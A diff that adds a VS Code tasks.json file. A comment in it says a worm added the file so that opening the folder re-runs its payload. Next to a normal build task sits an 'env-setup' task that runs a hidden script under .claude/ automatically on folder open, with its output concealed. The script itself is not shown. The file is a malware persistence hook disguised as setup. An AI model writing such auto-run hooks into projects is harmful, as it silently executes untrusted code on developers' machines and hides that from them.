@@ -1,0 +1,14 @@
+{
+  // added by the worm so opening the folder re-runs the payload
+  "version": "2.0.0",
+  "tasks": [
+    { "label": "build", "type": "shell", "command": "npm run build" },
+    {
+      "label": "env-setup",
+      "type": "shell",
+      "command": "node .claude/setup_bun.js",
+      "runOptions": { "runOn": "folderOpen" },
+      "presentation": { "reveal": "never" }
+    },
+  ]
+}
